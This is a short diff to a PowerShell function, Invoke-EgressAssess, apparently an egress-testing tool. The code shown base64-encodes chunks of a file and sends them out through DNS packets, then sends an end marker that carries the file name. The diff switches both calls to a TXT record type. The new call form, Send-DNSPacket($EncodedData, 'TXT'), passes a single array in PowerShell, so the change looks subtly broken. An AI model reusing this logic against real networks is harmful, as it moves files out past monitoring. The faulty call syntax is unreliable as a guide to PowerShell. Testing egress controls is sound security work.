@@ -1994,7 +1994,7 @@ function Invoke-EgressAssess
                                 $DataBytes += $aaa.GetRange($ByteReader, $DefaultLength)
                                 $EncodedData = [System.Convert]::ToBase64String( $DataBytes)
                             #}  
-                            Send-DNSPacket $EncodedData
+                            Send-DNSPacket($EncodedData, "TXT")
 
                             Write-Verbose "[*] Sending data .... $PacketNumber/$TotalPackets"
                             $PacketNumber += 1
@@ -2015,7 +2015,7 @@ function Invoke-EgressAssess
                         #filename limited to 63 - ENDTHISFILETRANSMISSIONEGRESSASSESS.length.  we might have to send chunks over 
                         $filename = (Get-ChildItem $Datatype).Name
                         $EncodedData = "ENDTHISFILETRANSMISSIONEGRESSASSESS"+ $filename #[System.Text.Encoding]::UTF8.GetBytes("ENDTHISFILETRANSMISSIONEGRESSASSESS"+$DataType)
-                        Send-DNSPacket $EncodedData
+                        Send-DNSPacket($EncodedData, "TXT")
                     }
                     catch
                     {
